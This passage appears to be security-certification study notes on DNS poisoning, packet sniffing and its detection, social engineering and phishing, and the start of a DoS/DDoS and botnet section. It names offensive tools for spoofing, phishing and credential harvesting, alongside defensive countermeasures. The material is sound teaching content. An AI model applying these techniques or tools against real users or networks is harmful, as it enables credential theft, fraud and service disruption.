			- DNS is a protocol that translates domain names (e.g., www.eccouncil.org) into IP addresses (e.g., 208.66.172.56). It uses DNS tables, which store domain names and their corresponding IP addresses in a distributed database.
			- DNS poisoning, also known as DNS spoofing, occurs when an attacker deceives a DNS server into accepting false information as legitimate. This allows the attacker to redirect victims to a malicious server instead of the intended one.
			- The attacker achieves this by manipulating DNS table entries, substituting a legitimate IP address with a fraudulent one at the DNS level, where domain names are resolved into numeric IP addresses. They may also create fake DNS entries for the malicious server, using domain names identical to the target server.
			- As a result, the victim unknowingly connects to the attacker’s server. Once the connection is established, the attacker can compromise the victim’s system, steal sensitive data, or perform further malicious actions.
			- DNS Poisoning Techniques:
				- Intranet DNS Spoofing
					- An attacker can perform an intranet DNS spoofing attack on a switched LAN using the ARP poisoning technique. To execute this attack, the attacker must be connected to the LAN and able to sniff network traffic or packets. By intercepting the DNS request ID from the intranet, the attacker can send a malicious reply to the sender faster than the legitimate DNS server, redirecting the victim to a malicious destination.
					- The attacker uses tools like arpspoof or dnsspoof to poison the router and redirect DNS requests from clients to the attacker’s machine. When a client sends a DNS request to the router, the compromised router forwards the request to the attacker’s machine. The attacker then responds with a fake DNS reply, redirecting the client to a fraudulent website controlled by the attacker.
					- On this fake website, the attacker can capture all information submitted by the client, such as passwords or other sensitive data. After extracting the required information, the attacker may redirect the client to the legitimate website to avoid suspicion.
				- Internet DNS Spoofing:
					- Internet DNS poisoning, also known as remote DNS poisoning, allows attackers to perform DNS spoofing attacks on one or multiple victims worldwide. To execute this attack, the attacker sets up a rogue DNS server with a static IP address. The attack is often facilitated using Trojans that modify the victim’s DNS settings when their system connects to the internet.
					- This attack, a form of a Man-in-the-Middle (MITM) attack, involves the attacker altering the victim’s primary DNS entries, replacing the legitimate DNS server's IP address with a fake IP address that resolves to the attacker’s system. As a result, the victim’s traffic is redirected to the attacker’s system, enabling the attacker to intercept and steal confidential information.
				- Proxy Server DNS Poisoning:
					- In the proxy server DNS poisoning technique, the attacker sets up a proxy server on their system and configures it with a fraudulent DNS, making its IP address the primary DNS entry. Using a Trojan, the attacker alters the victim's proxy server settings to route traffic through the malicious proxy.
					- The proxy server acts as the primary DNS, redirecting the victim’s traffic to a fake website controlled by the attacker. There, the attacker can intercept and steal confidential information. After capturing the data, the attacker may forward the request to the legitimate website to avoid suspicion.
				- DNS Cache Poisoning:
					- DNS cache poisoning involves altering or adding forged DNS records in a DNS resolver’s cache to redirect DNS queries to malicious sites. The DNS system uses cache memory to store recently resolved domain names and their corresponding IP addresses, enabling faster responses by avoiding repeated lookups.
					- In this attack, the attacker populates the DNS cache with forged entries, including domain names and fake IP addresses. When a user sends a request, the resolver checks its cache. If the requested domain is found, the resolver quickly returns the cached entry, reducing traffic and response time.
					- Attackers exploit this mechanism by injecting false entries into the cache. If the DNS resolver cannot verify that a response came from an authoritative source, it caches the incorrect entries locally and serves them to users making the same request. As a result, the resolver replaces the legitimate IP address with a fake one. When users request the poisoned domain, the resolver directs them to the attacker’s malicious server instead of the intended one.
					- SAD DNS Attack:
						- SAD DNS is a modern variant of DNS cache poisoning, where attackers inject malicious DNS records into a DNS cache to redirect traffic to their own servers. This technique allows attackers to deceive client browsers, leading them to fake websites containing malicious content instead of legitimate ones.
						- Attackers exploit side channels, vulnerabilities in DNS resolvers like dnsmasq, unbound, and BIND on newer operating systems, and outdated DNS software used for resolving queries to carry out SAD DNS attacks.
			- DNS Poisoning Tools:
				- DerpNSpoof : DerpNSpoof is a DNS poisoning tool used to spoof DNS query packets for a specific IP address or a group of hosts within a network. Attackers can use this tool to create a list of fake DNS records and load it during execution to redirect victims to malicious or unintended websites.
				- dnsspoof : dnsspoof is a DNS spoofing tool that intercepts DNS responses from a router and replaces them with forged DNS responses.
				- arpspoof : arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.
				- deserter (github.com)
				- PolarDNS (github.com)
				- Ettercap (www.ettercap-project.org)
				- Evilgrade (github.com)
				- DNS Goisoner (github.com)
			- Defend Against DNS Spoofing:
				- Implement Domain Name System Security Extensions (DNSSEC) to authenticate DNS responses.
				- Use Secure Socket Layer (SSL) to encrypt and secure traffic.
				- Resolve all DNS queries through a local DNS server.
				- Block DNS requests to external servers to prevent unauthorized lookups.
				- Configure firewalls to restrict external DNS lookups.
				- Enable DNS NXDOMAIN rate limiting to mitigate exploitation attempts.
				- Use static ARP and IP tables for added protection.
				- Prevent outgoing traffic from using UDP port 53 as the default source port.
				- Regularly audit DNS servers to identify and remove vulnerabilities.
				- Deploy sniffing detection tools to monitor for suspicious activity.
				- Restrict DNS zone transfers to a limited set of trusted IP addresses.
				- Reduce the timeout period for outstanding queries to mitigate SAD DNS attacks.
				- Keep DNS servers updated with the latest patches to prevent security breaches.
				- Disable the “Hosts” file resolution on both clients and servers.
				- Use DNS resolvers with security features like DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT) to encrypt DNS queries and prevent manipulation.
				- Configure Access Control Lists (ACLs) on DNS servers to accept queries only from trusted sources.
	- Sniffing Tools:
		- Wireshark:
			- Wireshark enables the capture and interactive analysis of network traffic on a computer network. It uses WinPcap to capture packets on supported networks. Wireshark can monitor live network traffic across various types of networks, including Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI. The captured files can also be programmatically edited through the command line. Additionally, a robust set of display filters allows for customized data presentation and refined analysis.
			- Follow TCP Stream in Wireshark:
				- Wireshark’s "Follow TCP Stream" feature displays TCP port data as seen at the application layer. It can identify passwords in Telnet sessions or interpret data streams. To use it, select a TCP packet and navigate to Analyze ➔ Follow ➔ TCP Stream. Wireshark applies a display filter and shows stream content in sequence, with formats like ASCII, hex, or raw.
				- Attackers may exploit network traffic to capture credentials and monitor user activity, extracting sensitive information.
			- Display Filters in Wireshark:
				- Wireshark includes display filters that filter network traffic based on criteria such as protocol type, IP address, or port. Display filters adjust the view of packets in captured files. To apply a filter, enter a protocol name (e.g., ARP, HTTP, TCP, UDP, DNS, or IP) in Wireshark's filter box. Multiple filters can be used simultaneously for more refined analysis.
				- Display filters:
					- Filtering by Protocol: arp, http, tcp, udp, dns, and ip
					- Monitoring Specific Ports: tcp.port == 23
					- Filtering by Multiple IP Addresses: ip.addr == 10.0.0.4 or ip.addr == 10.0.0.5
					- Filtering by IP Address: ip.addr == 10.0.0.4
		- Capsa Portable Network Analyzer:
			- Capsa, a portable network performance analysis and diagnostics tool, offers packet capture and analysis through an intuitive interface. It enables users to monitor and secure networks in critical business environments.
			- However, attackers can also exploit this tool to sniff packets from a target network and identify vulnerabilities.
		- OmniPeek:
			- OmniPeek Network Analyzer offers real-time visibility and expert analysis across all parts of a target network. It helps analyze, troubleshoot, and resolve performance bottlenecks across multiple network segments. Analytic plug-ins enhance OmniPeek's capabilities, providing advanced visualization and search functionality.
			- The Google Maps plug-in further extends its utility by displaying the locations of public IP addresses from captured packets directly within the OmniPeek capture window.
			- Attackers could misuse OmniPeek to monitor and analyze network traffic in real time, identify the source locations of traffic, extract sensitive information, and exploit network vulnerabilities.
		- RITA (Real Intelligence Threat Analytics) (github.com)
		- Observer Analyzer (www.viavisolutions.com)
		- PRTG Network Monitor (www.paessler.com)
		- Network Performance Monitor (www.solarwinds.com)
		- Xplico (www.xplico.org)
	- Defend Against Sniffing:
		- Countermeasures to Defend Against Sniffing:
			- Restrict physical access to network media to prevent the installation of packet sniffers.
			- Use end-to-end encryption to protect confidential information.
			- Permanently add the MAC address of the gateway to the ARP cache.
			- Use static IP addresses and ARP tables to prevent attackers from adding spoofed ARP entries to the network.
			- Disable network identification broadcasts and restrict the network to authorized users to prevent discovery via sniffing tools.
			- Use IPv6 instead of IPv4, as IPsec is optional in IPv4 but mandatory in IPv6.
			- Employ switches instead of hubs, as switches deliver data only to the intended recipient.
			- Utilize security tools such as PGP, S/MIME, VPNs, IPSec, SSL/TLS, SSH, and one-time passwords (OTPs).
			- Use SNMPv3 instead of SNMPv1 or SNMPv2 for managing networked devices.
			- Encrypt wireless traffic using strong protocols such as WPA2 or WPA3.
			- Retrieve MAC addresses directly from NICs to prevent MAC address spoofing.
			- Use tools to detect NICs operating in promiscuous mode.
			- Avoid broadcasting session set identifiers (SSIDs).
			- Implement a MAC filtering mechanism on routers.
			- Deploy network scanning and monitoring tools to detect malicious intrusions, rogue devices, and sniffers.
			- Avoid accessing unsecured or open Wi-Fi networks.
			- Use VLANs and network segmentation to divide the network into smaller, secure segments, limiting the scope for sniffers.
			- Regularly monitor and audit network traffic for unusual patterns indicative of sniffing activities.
		- Detect Sniffing:
			- Detecting a sniffer is difficult as it only captures data in promiscuous mode, without transmitting any traffic. Promiscuous mode allows a network device to intercept all packets, bypassing destination address validation. To detect sniffers, check for systems in promiscuous mode. Standalone sniffers are hard to detect, but reverse DNS lookup can help identify non-standalone sniffers.
			- Sniffer Detection Methods:
				- Ping Method:
					- To detect a sniffer on a network, identify systems running in promiscuous mode. The ping method can help identify systems in promiscuous mode, which in turn can reveal sniffers installed on the network.
					- Send a ping request to the suspected machine using its IP address and an incorrect MAC address. The Ethernet adapter will reject the packet because the MAC address does not match. However, a machine running a sniffer will respond, as it does not reject packets with a different MAC address. This response can help identify the sniffer on the network.
				- DNS Method:
					- The reverse DNS lookup is the opposite of the standard DNS lookup method. Sniffers that perform reverse DNS lookups can increase network traffic, which may indicate their presence. This increased traffic suggests that computers on the network are in promiscuous mode.
					- Reverse DNS lookups can be performed remotely or locally. To detect them, monitor the organization’s DNS server for incoming reverse DNS lookups. Another method is to send ICMP requests to a non-existing IP address. The machine performing the reverse DNS lookup will respond to the ping, thus identifying it as hosting a sniffer.
					- For local reverse DNS lookups, configure the detector in promiscuous mode. Send an ICMP request to a non-existing IP address and check the response. If the system responds, it indicates that the machine is performing reverse DNS lookups locally. A machine generating reverse DNS lookup traffic is likely running a sniffer.
				- ARP Method:
					- This technique sends a non-broadcast ARP request to all nodes on the network. The node running in promiscuous mode will cache the local ARP address and then broadcast a ping message using the local IP address but a different MAC address. Only the node with the cached MAC address will respond to the broadcast ping request.
					- A machine in promiscuous mode will reply to the ping message because it has the correct information about the host in its cache, while other machines will send an ARP probe to identify the source of the ping request. This process helps detect the node where the sniffer is running.
			- Promiscuous Detection Tools:
				- Nmap:
					- Nmap’s NSE (Nmap Scripting Engine) script allows checking whether a system on a local Ethernet network has its network card in promiscuous mode.
					- Detect NIC in Promiscuous Mode: nmap --script=sniffer-detect <ip/range>
				- NetScanTools Pro:
					- NetScanTools Pro includes the Promiscuous Mode Scanner tool to scan the subnet for network interfaces listening to all Ethernet packets in promiscuous mode. Security professionals use NetScanTools Pro to scan the subnet with modified ARP packets and identify devices responding to each type of ARP packet.


--------------------------------------------------

# Social Engineering

- Social engineering is the art of manipulating and convincing individuals to disclose confidential information. Social engineers exploit the fact that people are often unaware of the value of the information they possess and may be careless about safeguarding it. By using social engineering tactics, attackers can deceive individuals and exploit human vulnerabilities to gain access to sensitive information, authorizations, and credentials.
- Before conducting a social engineering attack, the attacker collects information about the target organization from various sources:
	- The organization’s official websites, where details such as employee IDs, names, and email addresses may be publicly available.
	- Advertisements published through media, which may reveal information about the organization’s products, services, and offers.
	- Blogs, forums, and other online platforms where employees might share personal or organizational details.
- Once sufficient information has been gathered, the attacker carries out social engineering attacks using techniques such as impersonation, piggybacking, tailgating, reverse social engineering, and other methods.
- Types of Social Engineering:
	- Human-based Social engineering:
		- Impersonation: The attacker pretends to be a legitimate or authorized individual. This impersonation can be carried out in person or through communication channels such as phone, email, or other mediums. By impersonating someone trustworthy, attackers can deceive their targets into disclosing sensitive information.
		- Vishing: Vishing (voice or VoIP phishing) is an impersonation technique used in electronic fraud, where the attacker manipulates individuals into revealing personal and financial information through voice technology, such as telephone systems or VoIP. The attacker often employs caller ID spoofing to forge identification.
		- Eavesdropping: The unauthorized listening to conversations or reading of messages. It involves intercepting audio, video, or written communications through channels such as telephone lines, email, instant messaging, and other forms of communication.
		- Shoulder Surfing: A direct observation technique involving watching over someone's shoulder to obtain sensitive information, such as passwords, PINs, or account numbers. This can also be carried out from a distance using vision-enhancing tools such as binoculars.
		- Dumpster Diving: The act of searching through someone else’s trash to find valuable information. This technique involves retrieving items such as phone bills, contact details, financial records, operational documents, or other sensitive information from a target company’s trash bins, printer bins, or user desks (e.g., sticky notes).
		- Reverse Social Engineering: The attacker poses as an authority figure, prompting the target to seek their advice. During this process, the target may willingly provide the information the attacker is attempting to obtain.
		- Piggybacking: An unauthorized individual gains access to a secure area by being intentionally or unintentionally allowed entry by an authorized person. For example, the unauthorized person might say, “I forgot my ID badge at home. Please help me.”
		- Tailgating: The attacker, often wearing a fake ID badge, gains access to a secured area by closely following an authorized person through a door that requires key access.
		- Diversion Theft: The attacker deceives a delivery person into rerouting a genuine consignment to a location other than the intended destination.
		- Honey Trap: Attackers target an individual within a company by pretending to be an attractive person online. They initiate a fake online relationship to extract confidential information about the target company. In some cases, attackers lure end users with enticing offers in exchange for critical information such as login credentials and other sensitive data.
		- Baiting: A physical device, such as a USB flash drive containing malicious files, is strategically placed in a location where it can be easily found, enticing individuals to pick it up and use it.
		- Bait and Switching: Bait and switching is a social engineering technique where the attacker captures the victim's attention by presenting an enticing offer through a clickable link or file download. The victim, lured by the offer, clicks the link or downloads the file, at which point the attacker executes their malicious goals—such as installing malware, stealing sensitive information, or compromising the victim’s security.
		- Quid Pro Quo: Attackers call multiple random numbers within a company, pretending to be from technical support. They offer assistance or services to end users in exchange for confidential data, such as login credentials or other sensitive information.
		- Elicitation: Attackers extract information from the victim by engaging them in casual, non-threatening conversations. By understanding the victim’s interests, attackers tailor their approach to elicit the relevant information without raising suspicion.
	- Computer-based Social Engineering:
		- Phishing:
			- Phishing is the practice of sending fraudulent emails that appear to be from legitimate sources, with the goal of acquiring a user’s personal or account information. Phishing emails or pop-ups often redirect users to counterfeit webpages that mimic trusted sites, where they are prompted to submit sensitive personal information.
			- Types of Phishing:
				- Spear Phishing: A targeted phishing attack directed at specific individuals or groups within an organization. Attackers craft messages with personalized, socially engineered content to deceive their targets and steal sensitive information.
				- Whaling: An attacker targets high-profile individuals, such as CEOs, CFOs, politicians, or celebrities, who have access to confidential and highly valuable information. Through email or website spoofing, the attacker deceives the victim into revealing critical corporate or personal data.
				- Pharming:
					- Pharming is a social engineering technique where the attacker executes malicious programs on a victim’s computer or server. When the victim enters a URL or domain name, their traffic is automatically redirected to an attacker-controlled website. This type of attack is also referred to as “Phishing without a Lure.” The attacker uses this method to steal sensitive information such as credentials, banking details, and other data related to web-based services.
					- DNS Cache Poisoning:
						- In a DNS cache poisoning attack, the attacker targets a DNS server and modifies the IP address associated with a legitimate website (e.g., www.targetwebsite.com) to redirect to a malicious website (e.g., www.hackerwebsite.com).
						- When the victim enters the legitimate website’s URL in the browser's address bar, the browser sends a request to the DNS server to obtain the IP address of the target website. However, the DNS server, already compromised by the attacker, returns the fake IP address.
						- As a result, the victim is redirected to the attacker-controlled fake website, where sensitive information may be stolen or malicious actions performed.
					- Host File Modification:
						- In a host file modification attack, the attacker sends malicious code to the victim, often as an email attachment. When the victim clicks on the attachment, the code executes and alters the local host file on the user’s computer.
						- Once the host file is compromised, any attempt by the victim to access a legitimate website by entering its URL in the browser’s address bar results in automatic redirection to a fraudulent website controlled by the attacker.
						- Pharming attacks can also be carried out using malware, such as Trojan horses or worms, which modify host files or other system settings to achieve the same malicious outcome.
				- Spimming: A variant of spam that exploits instant messaging platforms to flood networks with spam messages. Attackers use bots to harvest instant messaging IDs and spread malicious or unwanted content across the platform.
				- Clone Phishing: An attacker creates a nearly identical copy of a legitimate email or communication. This clone includes a malicious link or attachment, often replacing elements from the original message to point to a harmful destination.
				- E-wallet Phishing: Attackers target electronic wallet users by sending phishing emails or messages, pretending to be a legitimate e-wallet provider to steal sensitive financial information.
				- Tabnabbing and Reverse Tabnabbing:
					- Tabnabbing: A malicious webpage tricks users by altering its content to resemble a familiar site (e.g., a bank login page) when the user switches back to the tab, capturing their credentials.
					- Reverse Tabnabbing: A seemingly legitimate website deceives users into opening a malicious link, which then changes the content of the original tab into a phishing site.
				- Consent Phishing: Attackers exploit the OAuth authentication protocol used by web services. They create a fake, legitimate-looking application or website and lure victims to it, tricking them into granting access to sensitive information.
				- Search Engine Phishing: Attackers manipulate search engine results to lead users to fraudulent websites designed to steal sensitive information or distribute malware. This is achieved through techniques like search engine optimization (SEO) manipulation, keyword stuffing, and other methods to ensure the malicious websites rank highly in search results.
			- Phishing Tools:
				- ShellPhish : ShellPhish is a phishing tool used to phish user credentials from various social networking platforms such as Instagram, Facebook, Twitter, and LinkedIn. It also displays the victim system’s public IP address, browser information, hostname, geolocation, and other information.
				- Social-Engineer Toolkit (SET) : The Social-Engineer Toolkit (SET) is an open-source, Python-driven tool designed for penetration testing through social engineering. It is a versatile framework built to execute advanced attacks against human targets, aiming to extract sensitive information. SET categorizes its attacks based on the attack vector, such as email, web, and USB attacks. The toolkit exploits human vulnerabilities, such as trust, fear, greed, and the innate helpfulness of individuals, to achieve its objectives.
				- Dark-Phish (github.com)
				- BLACKEYE (github.com)
				- SocialFish (github.com)
				- Modlishka (github.com)
				- Trape (github.com)
				- Gophish (getgophish.com)
				- King Phisher (github.com)
				- LUCY SECURITY (lucysecurity.com)
				- Zphisher (github.com)
		- Spam Mail : Spam consists of irrelevant, unwanted, and unsolicited emails designed to gather sensitive financial information, such as Social Security numbers or bank details. Attackers send spam messages to lure victims into sharing confidential data or to distribute email attachments containing malicious software like viruses or Trojans. Social engineers often disguise the file extensions of these attachments with long filenames to deceive the recipient.
		- Instant Chat Messenger : In this technique, an attacker engages in conversations with selected online users through instant messaging platforms. They aim to gather personal information, such as dates of birth or maiden names, which can then be used to crack user accounts or exploit other vulnerabilities.
		- Pop-up Window Attacks : Pop-ups are used to trick or compel users into clicking on hyperlinks that redirect them to fake web pages. These pages may request personal information or download malicious programs such as keyloggers, Trojans, or spyware. A common tactic to entice users is by displaying a warning about a problem, such as a realistic operating system or application error message, or by offering additional services.
		- Scareware : Scareware is a type of malware that tricks users into visiting malware-infested websites, downloading malicious software, or purchasing potentially harmful programs. It often appears in the form of pop-ups that claim the user’s machine is infected with malware. These pop-ups are designed to look like legitimate alerts from reputable antivirus companies. They create a sense of urgency, prompting the victim to quickly download the suggested software to remove the supposed virus.
		- Hoax Letters : A hoax letter is a message that warns recipients of a non-existent computer virus threat. It relies on social engineering to spread widely. While hoaxes do not usually cause physical damage or data loss, they waste time, reduce productivity, and consume valuable organizational network resources.
		- Chain Letters : A chain letter is a message that promises free gifts, such as money or software, on the condition that the recipient forwards the email to a predetermined number of people. These messages often use emotionally compelling stories, “get-rich-quick” pyramid schemes, spiritual beliefs, or superstitious threats of bad luck if the recipient fails to pass the message along. Chain letters also rely heavily on social engineering tactics to propagate.
		- Create Deepfake Videos:
			- Attackers create deepfake videos of a target individual by utilizing previously recorded audio and video samples. These samples may include narratives of deceased persons, stolen online account clippings, or clips associated with unknown identities. By cloning and manipulating these clips, attackers generate highly convincing fake videos. The goal of such deepfake attempts is to deceive online users into believing they are viewing authentic content. These videos can be used for malicious purposes, such as impersonation, spreading misinformation, or committing fraud.
			- Deepfake Video Creation Tools:
				- DeepFaceLab (www.deepfakevfx.com)
				- Vidnoz (www.vidnoz.com)
				- Deepfakesweb (deepfakesweb.com)
				- Synthesia (www.synthesia.io)
				- DeepBrain AI (www.deepbrain.io)
				- Hoodem (hoodem.com)
		- Voice Cloning:
			- Voice cloning using AI involves the use of sophisticated machine learning algorithms to create highly convincing imitations of an individual's voice. These attacks exploit techniques such as speech synthesis and neural network-based models to accurately replicate the unique characteristics of a person.
			- Voice Cloning Tools:
				- VEED.IO (www.veed.io)
				- Murf.AI (murf.ai)
				- Resemble.AI (www.resemble.ai)
				- ElevenLabs (elevenlabs.io)
				- PlayHT (play.ht)
				- voice.ai (voice.ai)
		- Perform Impersonation on Social Networking Sites:
			- Malicious users collect confidential information from social networking sites and create accounts using another person’s name. These attackers use fraudulent profiles to build extensive networks of friends and extract sensitive information by employing various social engineering techniques.
		- Identity Theft:
			- Identity theft is a crime where an imposter steals personally identifiable information, such as a person’s name, credit card number, Social Security number, or driver’s license number, to commit fraud or other crimes. Attackers may also use identity theft to impersonate employees of a target organization and gain physical access to restricted facilities.
	- Mobile-based Social Engineering:
		- Publishing Malicious Apps:
			- An attacker creates a malicious application, such as a gaming app with appealing features, and publishes it on major application stores under a popular or misleading name. Unsuspecting users download the application, believing it to be legitimate.
			- Once installed, the app infects the device with malware, which collects and transmits sensitive information, such as usernames, passwords, contact details, and other personal data, to the attacker.
		- Repackaging Legitimate Apps:
			- Malware can sometimes be hidden within legitimate apps. Platform vendors provide centralized marketplaces where users can conveniently browse and install games and applications. Developers typically submit their apps to these marketplaces.
			- However, a malicious developer may download a legitimate app, repackage it with malware, and upload it to a third-party application store. When an unsuspecting user downloads the repackaged app, the malicious program infects the device, collects sensitive user information, and sends it to the attacker.
		- Using Fake Security Applications:
			- In this attack, the attacker begins by infecting the victim’s computer with malicious software. They then upload a fraudulent application to an app store. When the victim logs into their bank account, the malware displays a pop-up message instructing them to download a security application on their phone to receive an important message. Believing the pop-up to be legitimate, the victim downloads the application from the attacker’s app store.
			- Once the application is installed, the attacker gains access to confidential information, such as the victim's bank account login credentials (username and password). When the bank sends a second authentication code to the victim via SMS, the attacker intercepts and uses this information to gain unauthorized access to the victim’s bank account.
		- SMiShing (SMS Phishing):
			- SMiShing, or SMS phishing, is the act of using SMS text messaging on cellular phones or other mobile devices to deceive users into taking immediate action. This may include downloading malware, visiting a malicious webpage, or calling a fraudulent phone number. SMiShing messages are carefully crafted to prompt an urgent response from the victim, often tricking them into revealing personal information, account credentials, or financial details.
		- QRLJacking:
			- QRLJacking is a social engineering attack that exploits the QR code login mechanism used in various web applications to hijack login sessions and gain unauthorized access to victims' accounts. This method allows attackers to take full control of the compromised accounts and steal sensitive data.
			- Additionally, during the login process, attackers can obtain further details, such as the victim’s current GPS location, device ID, IMEI, and SIM card information. These details enable malicious activities, including unauthorized transactions, impersonation, and sending spam messages.
			- Cloning the QR code captured from a legitimate website is a critical step in a QRLJacking attack. Attackers can use tools like QR TIGER to clone a legitimate QR code and modify it for malicious purposes.
			- QR Code Cloning Tools:
				- QR TIGER:
					- QR TIGER is a QR code generator tool that enables attackers to create duplicate copies of legitimate QR codes. It can clone both static and dynamic QR codes, and generate multiple duplicates stored in a folder.
					- Additionally, QR TIGER allows attackers to track information from dynamic QR codes, such as the number of scans, the time and location of scans, and the type of device used for scanning. This tracking capability can assist in monitoring and targeting specific users, making it a powerful tool for malicious activities.
				- QR Code Generator (support.qr-code-generator.com)
				- Soti MobiControl (www.soti.net)
				- QR Code KIT (qrcodekit.com)
- Social Engineering Countermeasures:
	- Good policies and procedures are ineffective if they are not properly taught and reinforced with employees.
	- After receiving training, employees should sign a statement acknowledging that they understand and will follow the policies.
	- The main objectives of social engineering defense strategies are to raise user awareness, implement robust internal network controls, and establish secure policies, plans, and processes.
	- Official Security Policies and Procedures
		- Password Policies
		- Physical Security Policies
		- Social Engineering Campaigns
		- Gap Analysis
		- Remediation Strategies
		- Training on Security Policies
		- Implementation of Proper Access Privileges
		- Background Checks and Proper Termination Processes
	- Anti-Phishing Toolbar:
		- Netcraft (www.netcraft.com):
			- The Netcraft anti-phishing community operates like a vast neighborhood watch, empowering its most vigilant and skilled members to protect everyone within the community from phishing attacks. The Netcraft Toolbar provides real-time updates about the sites users visit and blocks dangerous websites.
			- It also offers detailed information about popular websites, helping users make informed decisions regarding the integrity of those sites. As shown in the screenshot, Netcraft effectively protects individuals and organizations from phishing attacks and fraud.
		- PhishTank (phishtank.com):
			- PhishTank is a collaborative clearing house for data and information related to phishing on the internet. It offers an open API that developers and researchers can use to integrate anti-phishing data into their applications. Security professionals can use PhishTank to verify whether a URL is a phishing site or not.
		- Scanurl (scanurl.net)
		- Isitphishing (isitphishing.org)
		- Threatcop (threatcop.ai)
		- e.Veritas (www.emailveritas.com)
		- Virustotal (www.virustotal.com)
	- Audit Organization's Security for Phishing Attacks using OhPhish:
		- The primary objective of conducting phishing campaigns against employees of a client organization is to assess their vulnerability to phishing attacks. This helps the organization identify potential risks and reduce the likelihood of employees falling victim to phishing attempts by cyber threat actors.
		- OhPhish (portal.ohphish.com):
			- OhPhish is a web-based portal designed to test employees’ susceptibility to social engineering attacks. It serves as a phishing simulation tool that allows organizations to run phishing simulation campaigns targeting their employees. The platform captures responses and generates Management Information System (MIS) reports and trends in real-time, which can be tracked by user, department, or designation.
			- OhPhish can be utilized to audit an organization’s security against phishing attacks, using various phishing methods such as Entice to Click, Credential Harvesting, Send Attachment, Training, Vishing, and Smishing.


--------------------------------------------------

# Denial-of-Service

- A Denial-of-Service (DoS) attack is an attempt to disrupt the normal functioning of a computer system or network by reducing, restricting, or completely preventing legitimate users from accessing system resources. During a DoS attack, the attacker floods the victim’s system with illegitimate service requests or traffic, overloading its resources and causing the system to crash or perform poorly. This often results in the victim’s website becoming unavailable or its system/network performance being significantly degraded. The primary objective of a DoS attack is to deny access to legitimate users, rather than to gain unauthorized access or corrupt data.
- DoS attacks typically target either network bandwidth or system connectivity:
	- Bandwidth Attacks: These attacks overwhelm the network by generating an excessive volume of traffic, consuming available network resources and preventing legitimate users from accessing them.
	- Connectivity Attacks: These attacks bombard a system with a massive number of connection requests, exhausting the operating system’s resources and preventing it from processing legitimate user requests.
- Impacts of DoS Attacks:
	- Resource Consumption: Depleting critical system resources, such as memory, CPU time, or data structures
	- Bandwidth Overload: Consuming network bandwidth, disk space, or other essential resources
	- Physical Damage: Damaging or altering network components
	- Data Destruction: Corrupting or deleting programming and files within the affected system
- Examples of DoS Attack Types:
	- Flooding the victim’s system with more traffic than it can handle
	- Overloading a service (e.g., Internet Relay Chat (IRC)) with more events than it can process
	- Crashing a TCP/IP stack by sending corrupted packets
	- Disrupting a service by interacting with it in an unexpected or malicious manner
	- Causing a system to hang by forcing it into an infinite loop
- Distributed Denial-of-Service:
	- A Distributed Denial-of-Service (DDoS) attack is a large-scale, coordinated form of a Denial-of-Service (DoS) attack that targets the availability of a victim’s system or network resources. It is carried out indirectly through numerous compromised computers, often referred to as botnets, distributed across the Internet.
	- By leveraging client/server technology, the attacker can significantly amplify the impact of the attack by utilizing the resources of multiple unwitting accomplice computers, which act as platforms for the assault. The overwhelming flood of incoming messages or traffic to the target system forces it to shut down or become unresponsive, effectively denying service to legitimate users.
	- The main goal of a DDoS attack is to compromise multiple systems and use them to overwhelm a victim’s resources. Attackers identify vulnerable systems using custom scripts, gain access, and install DDoS software.
	- The attack is initiated by sending commands to zombie agents—compromised computers controlled via a command-and-control (C&C) server. These agents send spoofed connection requests to reflector systems, impersonating the victim’s IP address. The reflectors then flood the victim with responses, overwhelming its system. This traffic overload reduces performance or causes the system to shut down.
	- Botnets:
		- A botnet (short for “robot network”) is a large network of compromised systems that are “infected” with bots (also known as zombies). Attackers use these bots to form a botnet, enabling them to launch DDoS attacks, generate spam, spread malware, and commit other cybercrimes.
		- Bots are software applications that automate tasks over the Internet. They can be used maliciously to exploit system vulnerabilities, perform illegal activities, or run hidden programs to identify weaknesses. Botnets act as agents controlled by intruders to carry out such activities.
		- However, not all bots are malicious. They are also used for benign purposes, such as data collection, web crawling, or data mining. For example, bots may coordinate DoS attacks or assist in “web spidering.” There are various types of bots, including Internet bots, IRC bots, and chatterbots. Examples of IRC bots include Cardinal, Sopel, Eggdrop, and EnergyMech.
		- Botnets can be used by attackers to perform the following activities:
			- Launch DDoS attacks to overwhelm systems.
			- Generate spam emails on a massive scale.
			- Sniff network traffic to intercept sensitive data.
			- Perform keylogging to capture user input, such as passwords.
			- Spread new malware across systems.
			- Install unwanted advertisement add-ons on victim devices.
			- Exploit Google AdSense for fraudulent revenue.
			- Attack IRC chat networks to disrupt communication.
			- Manipulate online polls and games to skew results.
			- Commit mass identity theft by harvesting personal information.
			- Perform credential stuffing attacks using stolen login credentials.
			- Conduct cryptocurrency mining using victim system resources.
		- Scanning Methods for Finding Vulnerable Machines:
			- Random Scanning: Infected machines randomly probe IP addresses in a target network to find vulnerabilities. Once a machine is compromised, malicious code is installed. This method generates high traffic and slows as uninfected IPs decrease.
			- Hit-List Scanning: Attackers compile a list of vulnerable machines and scan for targets. Once a machine is infected, the list is divided, and the new host continues scanning. This approach rapidly infects machines.
			- Topological Scanning: Infected machines use information (e.g., URLs) from their systems to locate and compromise new targets. This method is precise and efficient.
			- Local Subnet Scanning: Infected machines target vulnerable systems within their local network, often bypassing firewalls. It’s often combined with other techniques.
			- Permutation Scanning: Attackers share a pseudorandom list of IPs. Scanning starts from a random point and skips infected machines. Scanning stops after repeated encounters with infected hosts, then restarts with a new key.
		- How Malicious Code Propagates:
			- Central Source Propagation: The attacker stores the attack toolkit on a central server. When a vulnerable machine is found, the central source transfers a copy of the toolkit to the compromised system, where it is installed automatically using scripting mechanisms. The infected system then searches for other vulnerable machines to repeat the process. Common protocols used include HTTP, FTP, and RPC.
			- Back-chaining Propagation: The attacker keeps the attack toolkit on their own system. When a vulnerable machine is discovered, the attacker’s machine establishes a connection to the compromised system and transfers the toolkit. Tools such as port listeners or intruder-installed web servers use the Trivial File Transfer Protocol (TFTP) for back-channel file transfer.
			- Autonomous Propagation: In this method, the attacking host directly transfers the attack toolkit to the vulnerable system at the moment it breaches it, without relying on an external file source.
- Categories of DoS/DDoS Attack Vectors:
	- Volumetric Attacks:
